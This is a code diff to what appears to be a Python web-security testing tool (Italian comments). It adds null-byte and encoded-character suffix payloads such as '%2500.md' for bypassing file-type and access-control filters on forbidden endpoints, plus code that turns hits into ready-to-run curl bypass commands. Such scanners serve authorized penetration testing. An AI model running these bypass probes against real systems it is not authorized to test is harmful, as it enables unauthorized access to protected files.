@@ -4922,6 +4922,48 @@ class DiscrepancyTester:
             except:
                 pass
 
+        # --- Extension-level suffix bypass mutations ---
+        # Testano mutazioni applicate direttamente sull'endpoint (non su un sub-path).
+        # Coprono il pattern %2500 (double-encoded null byte) documentato su Juice Shop
+        # e su report BBP per file-type filter bypass in Express/nginx.
+        ext_suffix_mutations = [
+            ('Double-encoded null + .md',  '%2500.md'),
+            ('Double-encoded null + .pdf', '%2500.pdf'),
+            ('Double-encoded null + .txt', '%2500.txt'),
+            ('Double-encoded null + .jpg', '%2500.jpg'),
+            ('Raw null byte + .md',        '%00.md'),
+            ('Encoded newline + .md',      '%0a.md'),
+            ('Encoded tab + .md',          '%09.md'),
+            ('Encoded space + .md',        '%20.md'),
+            ('Encoded hash + .md',         '%23.md'),
+            ('Trailing dot',               '.'),
+            ('Trailing dot-dot',           '..'),
+            ('Encoded null only',          '%2500'),
+            ('Encoded null + .html',       '%2500.html'),
+        ]
+
+        for name, suffix in ext_suffix_mutations:
+            try:
+                test_url = f"{self.forbidden_endpoint}{suffix}"
+                response = self.session.get(test_url, timeout=5)
+                if response.status_code == 200:
+                    discrepancy = {
+                        'type': 'Nested Encoding',
+                        'subtype': 'Extension Suffix Bypass',
+                        'description': f'Extension bypass via suffix: {suffix!r}',
+                        'test_url': test_url,
+                        'encoded_path': suffix,
+                        'response_code': response.status_code,
+                        'forbidden_url': self.forbidden_endpoint,
+                        'variant': suffix,
+                        'severity': 'HIGH',
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "Encoding",
+                                       f"Extension suffix bypass ({name}): {test_url}")
+            except:
+                pass
+
     def test_protocol_tunneling_discrepancies(self):
         """Test protocol nesting confusion"""
         print("  🔀 Testing Protocol Tunneling Discrepancies...")
@@ -6894,6 +6936,8 @@ class BypassGenerator:
                 self._generate_protocol_bypass(discrepancy)
             elif bypass_type == 'Encoding Confusion':
                 self._generate_encoding_bypass(discrepancy)
+            elif bypass_type == 'Nested Encoding':
+                self._generate_nested_encoding_bypass(discrepancy)
             elif bypass_type == 'Anchor Tag Mutation':
                 # Only generate actionable bypass entries for confirmed bypasses
                 if discrepancy.get('is_confirmed_bypass'):
@@ -7073,6 +7117,40 @@ class BypassGenerator:
             'headers': {},
             'description': f"Encoding confusion bypass: {discrepancy['encoded_variant']}",
             'curl_command': self._generate_curl(discrepancy['test_url'], 'GET', {}),
+            'causal_trace': self._make_causal_trace(discrepancy),
+        }
+        if not self._is_semantic_duplicate(bypass):
+            self.bypasses.append(bypass)
+
+    def _generate_nested_encoding_bypass(self, discrepancy: Dict):
+        """Generate bypass from Nested Encoding / Extension Suffix discrepancy.
+
+        Handles two source patterns:
+        - Extension Suffix Bypass: discrepancy['test_url'] is the full URL
+          (e.g. https://target/ftp/eastere.gg%2500.md)
+        - Path-relative encoding: discrepancy['encoded_path'] is a relative path
+          appended to forbidden_endpoint (e.g. /%2561dmin)
+        """
+        test_url = discrepancy.get('test_url', '')
+        suffix   = discrepancy.get('encoded_path', discrepancy.get('variant', ''))
+
+        # Fallback: reconstruct URL from forbidden_endpoint + encoded_path
+        if not test_url and suffix:
+            base = discrepancy.get('forbidden_url', self.forbidden_endpoint)
+            test_url = f"{base}{suffix}"
+
+        if not test_url:
+            return
+        bypass = {
+            'id':           f"bypass_{len(self.bypasses) + 1}",
+            'type':         'Nested Encoding',
+            'discrepancy':  discrepancy,
+            'severity':     discrepancy.get('severity', 'HIGH'),
+            'method':       'GET',
+            'url':          test_url,
+            'headers':      {},
+            'description':  f"Extension suffix encoding bypass: {suffix!r}",
+            'curl_command': self._generate_curl(test_url, 'GET', {}),
             'causal_trace': self._make_causal_trace(discrepancy),
         }
         if not self._is_semantic_duplicate(bypass):
@@ -7421,6 +7499,10 @@ class BypassValidator:
         run_results = []
         confirmed_runs = 0
 
+        # Path Normalization bypasses usano redirect (es. /../ → 301 → parent/):
+        # allow_redirects=True per catturare il 200 finale invece del 301 intermedio.
+        follow_redirects = bypass.get('type') == 'Path Normalization'
+
         for run_idx in range(1, n_runs + 1):
             # Delay randomizzato inter-run (primo run senza delay)
             if run_idx > 1:
@@ -7431,7 +7513,7 @@ class BypassValidator:
                     url=bypass['url'],
                     headers=bypass.get('headers', {}),
                     timeout=10,
-                    allow_redirects=False
+                    allow_redirects=follow_redirects
                 )
                 sc = response.status_code
                 soft_blocked = self._is_soft_blocked(response)
@@ -7645,12 +7727,18 @@ APPLICATION STACK TRACEROUTE v4.1.0 - INTELLIGENT RECONSTRUCTION
                 'description': bypass.get('description', ''),
                 'validated': bypass.get('validation', {}).get('status') == 'CONFIRMED',
                 'curl_data': bypass.get('curl_data', {}),
-                'payload': str(bypass.get('payload', ''))
+                'payload': str(bypass.get('payload', '')),
+                'method': bypass.get('method', 'GET'),
             }
 
-            # Generate curl command (v2.8 style)
-            curl_command = self._generate_curl_command(bypass_entry)
-            bypass_entry['curl_command'] = curl_command
+            # Preserva il curl_command già calcolato dai generator (_generate_method_bypass,
+            # _generate_path_bypass, ecc.) che includono il metodo HTTP corretto.
+            # Ricalcola solo se assente (backward compat con bypass da engine esterno).
+            existing_curl = bypass.get('curl_command', '')
+            if existing_curl and not existing_curl.startswith('curl -i \'\''):
+                bypass_entry['curl_command'] = existing_curl
+            else:
+                bypass_entry['curl_command'] = self._generate_curl_command(bypass_entry)
 
             export_data['bypasses'].append(bypass_entry)
 
@@ -7671,8 +7759,12 @@ APPLICATION STACK TRACEROUTE v4.1.0 - INTELLIGENT RECONSTRUCTION
         curl_data = bypass_entry.get('curl_data', {})
 
         if not curl_data:
-            # Fallback: simple command based on bypass type
-            return f"curl -i '{bypass_entry.get('target', base_url)}'"
+            # Fallback: usa il method dal bypass_entry se disponibile
+            method = bypass_entry.get('method', 'GET')
+            url = bypass_entry.get('target', base_url)
+            if method and method != 'GET':
+                return f"curl -i -X {method} '{url}'"
+            return f"curl -i '{url}'"
 
         method = curl_data.get('method', 'GET')
 
